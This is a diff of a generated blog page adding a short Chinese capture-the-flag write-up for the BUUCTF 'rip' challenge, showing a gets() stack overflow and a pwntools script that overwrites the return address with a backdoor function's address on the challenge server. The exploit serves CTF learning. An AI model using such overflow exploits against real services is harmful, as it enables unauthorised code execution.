@@ -5,10 +5,10 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="BUUCTF rip, L">
-    <meta name="description" content="
-        document.querySelectorAll(&#39;.github-emoji&#39;)
-          .forEach(el =&gt; {
-            if (!el.dataset.src) { return">
+    <meta name="description" content="入门栈溢出题目，首先checksec一下64位程序，没有任何保护
+
+拖入IDA查看,F5大法好首先是main函数还有一个后门函数fun()很明显,main函数中的gets存在溢出,接下来来确定溢出字节数相对于EIP有23个字节exp如下
+f">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -406,14 +406,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-01-23
+                    2020-01-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    52
+                    153
                 </div>
                 
 
@@ -436,7 +436,21 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <script>
+                <p>入门栈溢出题目，首先checksec一下<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/1.jpg" alt=""><br>64位程序，没有任何保护</p>
+<a id="more"></a>
+<p>拖入IDA查看,F5大法好<br>首先是main函数<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/2.jpg" alt=""><br>还有一个后门函数fun()<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/3.jpg" alt=""><br>很明显,main函数中的gets存在溢出,接下来来确定溢出字节数<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/4.jpg" alt=""><br>相对于EIP有23个字节<br>exp如下</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment" spellcheck="true">#io = process('./rip')</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27031</span><span class="token punctuation">)</span>
+
+fun_addr <span class="token operator">=</span> <span class="token number">0x40118a</span>
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">23</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fun_addr<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/5.jpg" alt=""></p>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -593,33 +607,32 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/LawlietLW.github.io/2020/01/23/buuctf-rip/">
+                <a href="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="BUUCTF rip">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="BUUCTF warmup_csaw_2016">
                         
-                        <span class="card-title">BUUCTF rip</span>
+                        <span class="card-title">BUUCTF warmup_csaw_2016</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return
+                            checksec64位程序，没有保护拖入IDA查看,F5大法同样有一个后门函数，这个后门函数直接读取flag所以做法和rip一样直接贴exp
+from pwn import *
+
+#io = process('./warmup_csaw_2
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-01-23
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-01-30
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -632,7 +645,6 @@
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -642,10 +654,6 @@
                     
                     <a href="/LawlietLW.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
                         <span class="chip bg-color">栈溢出</span>
-                    </a>
-                    
-                    <a href="/LawlietLW.github.io/tags/rip/">
-                        <span class="chip bg-color">rip</span>
                     </a>
                     
                 </div>
@@ -855,7 +863,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">3.9k</span>&nbsp;字
+                class="white-color">4.4k</span>&nbsp;字
             
             
             
